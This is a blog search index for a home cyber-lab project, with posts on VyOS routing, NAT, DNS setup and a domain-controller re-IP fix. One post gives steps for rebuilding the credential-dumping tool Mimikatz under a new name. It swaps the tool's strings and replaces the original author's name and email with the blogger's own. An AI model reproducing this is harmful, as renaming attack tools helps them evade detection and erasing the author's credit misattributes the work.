[{"content":"🔧 About OPFORGE OPFORGE is a purpose-built, full-spectrum cyber operations lab designed to fuse red team emulation, blue team detection, and AI/ML integration into a living portfolio of validated cybersecurity capabilities.\nOriginally created as a threat emulation testbed, OPFORGE has evolved into a scalable platform for demonstrating hands-on technical depth across disciplines—anchored to certifications, graduate-level research, and operational experience.\n🎯 Mission To transform certifications, technical expertise, and advanced academic learning into working cyber capability, with real artifacts, modular infrastructure, and educational value.\n🔍 What Makes OPFORGE Different ✅ Certification-Aligned – Each component is mapped to a professional certification like OSCP, GCFA, GREM, GXPN, CISSP, GPYC, PMP, and more. 🔄 Red ↔ Blue Integration – Supports bidirectional learning through emulation and detection validation workflows. 🤖 AI/ML Integration – Purpose-built to host anomaly detection, explainable AI, and cyber data science pipelines. 🧭 Built in Phases – Progress is captured in a public blog series—transparent, modular, and iterative. 📚 Portfolio-Ready – Designed for professional storytelling, resume support, and mentorship use. 🧱 Current Phase (June 2025) 🌐 RED_NET segment is operational with internet egress via routed VyOS chain 🧠 Blog series launched to chronicle phased lab build and skill integration 🔄 Routing structure being extended to support segmented zones (EXT, DMZ, INT) 📊 Log pipeline to OpenSearch is in early deployment phase 📁 Artifact documentation and GitHub repo alignment in progress 💡 Who It\u0026rsquo;s For Cyber professionals building a practical portfolio Learners aligning certifications to real-world skill Recruiters or hiring managers seeking tangible proof of ability Technologists focused on threat-informed defense and detection engineering 🛠️ Created \u0026amp; Maintained By A cybersecurity practitioner with experience across red team, blue team, detection engineering, and threat emulation. Certified in OSCP, CISSP, GCFA, GREM, GXPN, and more. Currently pursuing a Master of Science in Artificial Intelligence \u0026amp; Machine Learning.\nLearn more, read the blog, or explore artifacts at OPFORGE.dev\n","permalink":"https://opforge.dev/about/","summary":"\u003ch1 id=\"-about-opforge\"\u003e🔧 About OPFORGE\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003eOPFORGE\u003c/strong\u003e is a purpose-built, full-spectrum cyber operations lab designed to fuse red team emulation, blue team detection, and AI/ML integration into a living portfolio of validated cybersecurity capabilities.\u003c/p\u003e\n\u003cp\u003eOriginally created as a threat emulation testbed, OPFORGE has evolved into a scalable platform for demonstrating hands-on technical depth across disciplines—anchored to certifications, graduate-level research, and operational experience.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-mission\"\u003e🎯 Mission\u003c/h2\u003e\n\u003cp\u003eTo \u003cstrong\u003etransform certifications, technical expertise, and advanced academic learning into working cyber capability\u003c/strong\u003e, with real artifacts, modular infrastructure, and educational value.\u003c/p\u003e","title":"About OPFORGE"},{"content":" \u0026ldquo;Before you can emulate an adversary, you must be able to reach the battlefield.\u0026rdquo;\n🧭 Overview In Post #1, we covered the initial design philosophy behind OPFORGE and the high-level segmentation plan. Now it’s time to get traffic moving. In this post, we focus on building and validating the first complete routing path from RED_NET to the public internet.\nThis milestone enables offensive tooling on opf-red01 and opf-lnx01 to begin live-fire interaction with the outside world in a controlled and observable way. The setup also establishes our first artifact set: routed VyOS configs, packet captures, and validation logs.\n🌐 Confirmed Network Map (Phase 1) opf-red01: 192.168.10.12 opf-lnx01: 192.168.10.10 opf-rt-red (eth0): 192.168.10.1 (gateway for RED_NET) opf-rt-red (eth1): 192.168.10.2 (connects to opf-rt-inet) opf-rt-inet (eth0): 192.168.10.3 (receives from opf-rt-red) opf-rt-inet (eth1): 192.168.1.25 (bridged NIC w/ internet access) Static routes and NAT were configured in VyOS to allow NAT masquerading and routing between RED_NET and the internet.\n🔧 VyOS Routing Summary On opf-rt-red:\nset interfaces ethernet eth0 address \u0026#39;192.168.10.1/24\u0026#39; set interfaces ethernet eth1 address \u0026#39;192.168.10.2/30\u0026#39; set protocols static route 0.0.0.0/0 next-hop 192.168.10.3 On opf-rt-inet:\nset interfaces ethernet eth0 address \u0026#39;192.168.10.3/30\u0026#39; set interfaces ethernet eth1 address \u0026#39;192.168.1.25/24\u0026#39; set nat source rule 100 outbound-interface \u0026#39;eth1\u0026#39; set nat source rule 100 source address \u0026#39;192.168.10.0/24\u0026#39; set nat source rule 100 translation address \u0026#39;masquerade\u0026#39; set protocols static route 192.168.10.0/24 next-hop 192.168.10.2 ✅ Routing Validation Confirmed default gateway on both opf-red01 and opf-lnx01 is 192.168.10.1 ICMP verified up the chain to opf-rt-inet Outbound DNS resolution validated from opf-red01 Reached external IP (e.g. curl ifconfig.me) from RED_NET Captured outbound traffic on opf-rt-inet (eth1) with tcpdump 🧪 Artifacts Captured VyOS configs for opf-rt-red and opf-rt-inet TCP dump from outbound session (available in /artifacts/rednet-routing/) Markdown logs in Obsidian for each validation step 📌 Coming Next In Post #3, we begin laying the groundwork for network segmentation beyond RED_NET. We\u0026rsquo;ll finalize interface assignments and static IP plans for opf-rt-ext, opf-rt-dmz, and opf-rt-int. This paves the way for introducing detection points, intrusion zones, and the DMZ firewall.\nStay online, stay offensive.\n— H.Y.P.R.\n","permalink":"https://opforge.dev/posts/opforge_post_2_routing/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cem\u003e\u0026ldquo;Before you can emulate an adversary, you must be able to reach the battlefield.\u0026rdquo;\u003c/em\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"-overview\"\u003e🧭 Overview\u003c/h3\u003e\n\u003cp\u003eIn Post #1, we covered the initial design philosophy behind OPFORGE and the high-level segmentation plan. Now it’s time to get traffic moving. In this post, we focus on building and validating the first complete routing path from RED_NET to the public internet.\u003c/p\u003e\n\u003cp\u003eThis milestone enables offensive tooling on \u003ccode\u003eopf-red01\u003c/code\u003e and \u003ccode\u003eopf-lnx01\u003c/code\u003e to begin live-fire interaction with the outside world in a controlled and observable way. The setup also establishes our first artifact set: routed VyOS configs, packet captures, and validation logs.\u003c/p\u003e","title":"First Route, First Blood: Standing Up RED NET"},{"content":" \u0026ldquo;Before we wage war in cyberspace, we must first build the battlefield.\u0026rdquo;\n🧭 Overview Welcome to the first post of the OPFORGE blog series. This series walks through the step-by-step development of OPFORGE: a purpose-built, full-spectrum cyber operations lab environment designed to showcase and implement real-world capabilities tied to professional certifications, advanced education, and operational experience.\nIn this foundational post, we focus on Phase 1: the initial lab topology and routing architecture. This layer sets the stage for future red vs blue scenarios, AI-driven detection, and system-level investigations.\n🌐 Initial Network Segment: RED_NET The RED_NET is our threat emulation and offensive operations subnet. It contains:\nopf-red01 – Main Red Team C2 (Sliver, Covenant, custom tooling) opf-lnx01 – Linux-based offensive staging (Python tooling, Impacket, BloodHound) Gateway: opf-rt-red (eth0: 192.168.10.1) Subnet: 192.168.10.0/24\n🔁 Routing Infrastructure (Phase 1) This phase implements multi-hop routing from RED_NET to the internet via chained VyOS routers. It emulates a real-world multi-zone topology with enforced segmentation and control points.\nRouting Flow: [opf-red01] [opf-lnx01] | | | | +------\u0026gt; [opf-rt-red (eth0:192.168.10.1)] | v [opf-rt-inet (eth0:192.168.10.2)] | v [opf-rt-inet (eth1:192.168.1.25)] — Bridged to internet opf-rt-red is the edge router for RED_NET and the default gateway for red team boxes. opf-rt-inet serves as a central hub with a bridged NIC to the physical network, allowing internet access from controlled segments. ⚙️ Not Yet Configured (Next Steps) These routers are placed but not yet configured. These represent the external, DMZ, and internal zones:\nRouter NIC Destination Note opf-rt-inet eth2 To opf-rt-ext Static IP pending opf-rt-ext TBD To opf-rt-dmz (pfSense) Static IP pending opf-rt-dmz TBD To opf-rt-int Static IP pending opf-rt-int TBD To INTERNAL_NET (192.168.30.0/24) Not set up yet This modular build enables staged validation and deliberate segmentation — ideal for tracking ingress/egress across threat zones.\n🔖 Artifacts Created Draft network map (WIP; will be converted to diagram) VyOS routing configs for opf-rt-red and opf-rt-inet Lab documentation in Obsidian + GitHub wiki 📌 Coming Next In Post #2, we’ll complete routing between opf-rt-red and opf-rt-inet, validate internet access from the RED_NET, and capture packet traces to establish baseline network behavior. We\u0026rsquo;ll also begin designing the next routing phase—linking opf-rt-inet1 to opf-rt-ext—to scaffold segmentation for DMZ and internal services.\nAs we build, each component will map back to a capability area and ultimately showcase how certifications and operational knowledge translate into real-world implementation.\nStay sharp.\n— H.Y.P.R.\n","permalink":"https://opforge.dev/posts/opforge_post_1_genesis/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cem\u003e\u0026ldquo;Before we wage war in cyberspace, we must first build the battlefield.\u0026rdquo;\u003c/em\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"-overview\"\u003e🧭 Overview\u003c/h3\u003e\n\u003cp\u003eWelcome to the first post of the OPFORGE blog series. This series walks through the step-by-step development of OPFORGE: a purpose-built, full-spectrum cyber operations lab environment designed to showcase and implement real-world capabilities tied to professional certifications, advanced education, and operational experience.\u003c/p\u003e\n\u003cp\u003eIn this foundational post, we focus on Phase 1: the initial lab topology and routing architecture. This layer sets the stage for future red vs blue scenarios, AI-driven detection, and system-level investigations.\u003c/p\u003e","title":"OPFORGE Genesis: Designing a Full-Spectrum Cyber Lab"},{"content":"OPFORGE Network Internet Access Setup Guide This guide outlines the configuration steps used to enable full internet access from the Red Network within the OPFORGE lab environment. It includes configuration of VyOS routers opf-rtred and opf-rt-inet, as well as ensuring connectivity from a host such as opf-lnx01.\n🔧 1. opf-rt-inet Configuration (Internet Gateway) Interfaces eth0: 192.168.10.2/24 (RED_NET) eth1: 192.168.1.25/24 (WAN - External/Internet-facing) Commands configure # Set interface IPs (if not set) set interfaces ethernet eth0 address 192.168.10.2/24 set interfaces ethernet eth1 address 192.168.1.25/24 # Default route to WAN gateway set protocols static route 0.0.0.0/0 next-hop 192.168.1.1 # Enable NAT for RED_NET to WAN set nat source rule 100 outbound-interface eth1 set nat source rule 100 source address 192.168.10.0/24 set nat source rule 100 translation address masquerade # Enable DNS forwarding set service dns forwarding listen-address 192.168.10.2 set service dns forwarding allow-from 192.168.10.0/24 set service dns forwarding name-server 1.1.1.1 set service dns forwarding name-server 8.8.8.8 commit save exit 🔧 2. opf-rtred Configuration (Red Network Router) Interfaces eth0: 192.168.10.1/24 (RED_NET) Commands configure # Set static default route to forward traffic to opf-rt-inet set protocols static route 0.0.0.0/0 next-hop 192.168.10.2 # Set DNS resolver to point to opf-rt-inet set system name-server 192.168.10.2 commit save exit 🧪 3. opf-lnx01 or Red Network Host Ensure the following are configured on your RED_NET endpoints:\nExample /etc/resolv.conf nameserver 192.168.10.2 Test Connectivity ping 8.8.8.8 ping google.com ✅ Verification Checklist Device Internet (8.8.8.8) DNS Resolution (google.com) opf-rt-inet ✅ ✅ opf-rtred ✅ ✅ opf-lnx01 ✅ ✅ Author: Alfredo Pelaez\nDate: 2025-06-12\nLab: OPFORGE – Threat Emulation \u0026amp; Detection Validation\n","permalink":"https://opforge.dev/posts/opforge-internet-setup/","summary":"\u003ch1 id=\"opforge-network-internet-access-setup-guide\"\u003eOPFORGE Network Internet Access Setup Guide\u003c/h1\u003e\n\u003cp\u003eThis guide outlines the configuration steps used to enable full internet access from the Red Network within the OPFORGE lab environment. It includes configuration of VyOS routers \u003ccode\u003eopf-rtred\u003c/code\u003e and \u003ccode\u003eopf-rt-inet\u003c/code\u003e, as well as ensuring connectivity from a host such as \u003ccode\u003eopf-lnx01\u003c/code\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-1-opf-rt-inet-configuration-internet-gateway\"\u003e🔧 1. \u003ccode\u003eopf-rt-inet\u003c/code\u003e Configuration (Internet Gateway)\u003c/h2\u003e\n\u003ch3 id=\"interfaces\"\u003eInterfaces\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeth0\u003c/code\u003e: 192.168.10.2/24 (RED_NET)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eeth1\u003c/code\u003e: 192.168.1.25/24 (WAN - External/Internet-facing)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"commands\"\u003eCommands\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econfigure\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set interface IPs (if not set)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset interfaces ethernet eth0 address 192.168.10.2/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset interfaces ethernet eth1 address 192.168.1.25/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Default route to WAN gateway\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset protocols static route 0.0.0.0/0 next-hop 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Enable NAT for RED_NET to WAN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset nat source rule \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e outbound-interface eth1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset nat source rule \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e source address 192.168.10.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset nat source rule \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e translation address masquerade\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Enable DNS forwarding\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset service dns forwarding listen-address 192.168.10.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset service dns forwarding allow-from 192.168.10.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset service dns forwarding name-server 1.1.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset service dns forwarding name-server 8.8.8.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esave\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-2-opf-rtred-configuration-red-network-router\"\u003e🔧 2. \u003ccode\u003eopf-rtred\u003c/code\u003e Configuration (Red Network Router)\u003c/h2\u003e\n\u003ch3 id=\"interfaces-1\"\u003eInterfaces\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeth0\u003c/code\u003e: 192.168.10.1/24 (RED_NET)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"commands-1\"\u003eCommands\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econfigure\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set static default route to forward traffic to opf-rt-inet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset protocols static route 0.0.0.0/0 next-hop 192.168.10.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set DNS resolver to point to opf-rt-inet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset system name-server 192.168.10.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esave\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-3-opf-lnx01-or-red-network-host\"\u003e🧪 3. \u003ccode\u003eopf-lnx01\u003c/code\u003e or Red Network Host\u003c/h2\u003e\n\u003cp\u003eEnsure the following are configured on your RED_NET endpoints:\u003c/p\u003e","title":"OPFORGE Network Internet Access Setup Guide"},{"content":"OPFORGE Rebrand Checklist for Mimikatz This step-by-step guide simplifies the process of rebranding Mimikatz under the OPFORGE project. Use it to create a portfolio-grade build aligned with Threat Emulation, Detection Engineering, and Explainable AI objectives.\nMaintainer: Alfredo Pelaez\nDate: 2025-05-31\nProject Alignment: OPFORGE | High-Yield Performance \u0026amp; Results (H.Y.P.R.) Mindset\n✅ Phase 1: Clone and Prepare the Repo Clone the Mimikatz repository:\ngit clone --recursive https://github.com/gentilkiwi/mimikatz.git Tools/mimikatz Create a backup copy:\ncp -r Tools/mimikatz Tools/mimikatz-original Prepare script path and workspace:\nNew-Item -Path \u0026#34;C:\\OPFORGE\\Scripts\u0026#34; -ItemType Directory -Force ✅ Phase 2: Automated Rebranding via PowerShell Run the global text replacement:\n$root = \u0026#34;C:\\OPFORGE\\Tools\\mimikatz\u0026#34; Get-ChildItem -Path $root -Recurse -File | ForEach-Object { (Get-Content $_.FullName) ` -replace \u0026#34;mimikatz\u0026#34;, \u0026#34;opforge\u0026#34; ` -replace \u0026#34;Mimikatz\u0026#34;, \u0026#34;OPFORGE\u0026#34; ` -replace \u0026#34;MIMIKATZ\u0026#34;, \u0026#34;OPFORGE\u0026#34; ` -replace \u0026#34;gentilkiwi\u0026#34;, \u0026#34;opforge\u0026#34; ` -replace \u0026#34;Benjamin\u0026#34;, \u0026#34;Alfredo\u0026#34; ` -replace \u0026#34;Delpy\u0026#34;, \u0026#34;Pelaez\u0026#34; ` -replace \u0026#34;benjamin@gentilkiwi.com\u0026#34;, \u0026#34;alfredo@opforge.dev\u0026#34; ` | Set-Content $_.FullName } Rename key project files/folders:\nRename-Item \u0026#34;$root\\mimikatz.sln\u0026#34; \u0026#34;opforge.sln\u0026#34; Rename-Item \u0026#34;$root\\mimikatz\u0026#34; \u0026#34;opforge\u0026#34; Patch the solution file:\n(Get-Content \u0026#34;$root\\opforge.sln\u0026#34;) ` -replace \u0026#34;mimikatz.vcxproj\u0026#34;, \u0026#34;opforge.vcxproj\u0026#34; ` | Set-Content \u0026#34;$root\\opforge.sln\u0026#34; ✅ Phase 3: Branding Customization Update terminal banner in opforge.c:\nkprintf(L\u0026#34;\\n OPFORGE Toolkit v1.0 | Threat Emulation | Detection Engineering | XAI\\n\u0026#34;); kprintf(L\u0026#34; H.Y.P.R. Mindset | https://opforge.dev | Maintainer: Alfredo Pelaez\\n\\n\u0026#34;); Modify the shell prompt:\nkprintf(L\u0026#34;\\nopforge # \u0026#34;); Optionally update:\nVersion macros about module text License headers ✅ Phase 4: Build and Debug Open the solution in Visual Studio 2022.\nRetarget the solution:\nRight-click the solution → Retarget Projects → Select your installed toolset Set the startup project to opforge, build for x64 | Release.\nTroubleshoot build errors:\nResolve missing exports like kdbg_mimikatz Patch unresolved symbols Update the .def file to match your rebranded entry points ✅ Phase 5: Validation and Use Run the final binary:\n.\\x64\\opforge.exe Confirm output:\nASCII art and terminal header are updated Interactive prompt shows opforge # All commands execute without errors Version control:\ngit add . git commit -m \u0026#34;Apply OPFORGE rebranding to Mimikatz base\u0026#34; git push origin opforge-main 🧠 Future Improvements Rename command strings via macro (L\u0026quot;sekurlsa\u0026quot; → OPF_SEKURLSA) and refactor source Customize internal module help text Build .msi or .zip for OPFORGE deployment Integrate telemetry or logging for operator feedback (in lab only) End of Checklist\nThis post is part of the OPFORGE project series on Threat Emulation and AI-Enhanced Detection Engineering.\n","permalink":"https://opforge.dev/posts/2025-05-31-opforge_rebrand_checklist/","summary":"\u003ch1 id=\"opforge-rebrand-checklist-for-mimikatz\"\u003eOPFORGE Rebrand Checklist for Mimikatz\u003c/h1\u003e\n\u003cp\u003e\u003cem\u003eThis step-by-step guide simplifies the process of rebranding Mimikatz under the OPFORGE project. Use it to create a portfolio-grade build aligned with Threat Emulation, Detection Engineering, and Explainable AI objectives.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMaintainer\u003c/strong\u003e: Alfredo Pelaez\u003cbr\u003e\n\u003cstrong\u003eDate\u003c/strong\u003e: 2025-05-31\u003cbr\u003e\n\u003cstrong\u003eProject Alignment\u003c/strong\u003e: \u003ca href=\"https://opforge.dev\"\u003eOPFORGE\u003c/a\u003e | High-Yield Performance \u0026amp; Results (H.Y.P.R.) Mindset\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-phase-1-clone-and-prepare-the-repo\"\u003e✅ Phase 1: Clone and Prepare the Repo\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cinput disabled=\"\" type=\"checkbox\"\u003e Clone the Mimikatz repository:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone --recursive https://github.com/gentilkiwi/mimikatz.git Tools/mimikatz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cinput disabled=\"\" type=\"checkbox\"\u003e Create a backup copy:\u003c/p\u003e","title":"OPFORGE Rebrand Checklist for Mimikatz"},{"content":"Background Originally, OPF-DC01 was deployed with an IP address in the CSOCINFRA (192.168.20.0/24) subnet. However, per OPFORGE\u0026rsquo;s logical segmentation, all domain services must reside in the ADINFRA (192.168.40.0/24) segment to maintain operational and architectural integrity.\nProblem OPF-DC01 had IP 192.168.20.100 (incorrect subnet). The gateway was misconfigured as 192.168.50.5 (C2 CONTROL). This broke domain service accessibility and violated the subnet\u0026rsquo;s trust boundary. Solution 1. Re-IP OPF-DC01 to ADINFRA New-NetIPAddress -InterfaceAlias \u0026#34;Ethernet0\u0026#34; ` -IPAddress \u0026#34;192.168.40.100\u0026#34; ` -PrefixLength 24 ` -DefaultGateway \u0026#34;192.168.40.5\u0026#34; 2. Update DNS Set-DnsClientServerAddress -InterfaceAlias \u0026#34;Ethernet0\u0026#34; -ServerAddresses \u0026#34;192.168.40.100\u0026#34; 3. Fix Default Route Remove-NetRoute -InterfaceAlias \u0026#34;Ethernet0\u0026#34; -NextHop 192.168.50.5 New-NetRoute -InterfaceAlias \u0026#34;Ethernet0\u0026#34; ` -DestinationPrefix \u0026#34;0.0.0.0/0\u0026#34; ` -NextHop \u0026#34;192.168.40.5\u0026#34; Results OPF-DC01 now properly resides at 192.168.40.100. Routing flows through opf-fw01 via gateway 192.168.40.5. It is ready to serve domain joins from endpoints like OPF-MBR01. ","permalink":"https://opforge.dev/posts/2025-05-27-opf-dc01-corrective-ip-alignment/","summary":"\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003eOriginally, \u003ccode\u003eOPF-DC01\u003c/code\u003e was deployed with an IP address in the \u003ccode\u003eCSOCINFRA (192.168.20.0/24)\u003c/code\u003e subnet. However, per OPFORGE\u0026rsquo;s logical segmentation, all domain services must reside in the \u003ccode\u003eADINFRA (192.168.40.0/24)\u003c/code\u003e segment to maintain operational and architectural integrity.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"problem\"\u003eProblem\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eOPF-DC01\u003c/code\u003e had IP \u003ccode\u003e192.168.20.100\u003c/code\u003e (incorrect subnet).\u003c/li\u003e\n\u003cli\u003eThe gateway was misconfigured as \u003ccode\u003e192.168.50.5\u003c/code\u003e (C2 CONTROL).\u003c/li\u003e\n\u003cli\u003eThis broke domain service accessibility and violated the subnet\u0026rsquo;s trust boundary.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003ch3 id=\"1-re-ip-opf-dc01-to-adinfra\"\u003e1. Re-IP OPF-DC01 to ADINFRA\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNew-NetIPAddress -InterfaceAlias \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Ethernet0\u0026#34;\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -IPAddress \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.40.100\u0026#34;\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -PrefixLength \u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -DefaultGateway \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.40.5\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"2-update-dns\"\u003e2. Update DNS\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSet-DnsClientServerAddress -InterfaceAlias \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Ethernet0\u0026#34;\u003c/span\u003e -ServerAddresses \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.40.100\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"3-fix-default-route\"\u003e3. Fix Default Route\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRemove-NetRoute -InterfaceAlias \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Ethernet0\u0026#34;\u003c/span\u003e -NextHop \u003cspan style=\"color:#ae81ff\"\u003e192.168\u003c/span\u003e.50.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNew-NetRoute -InterfaceAlias \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Ethernet0\u0026#34;\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -DestinationPrefix \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0.0.0.0/0\u0026#34;\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -NextHop \u003cspan 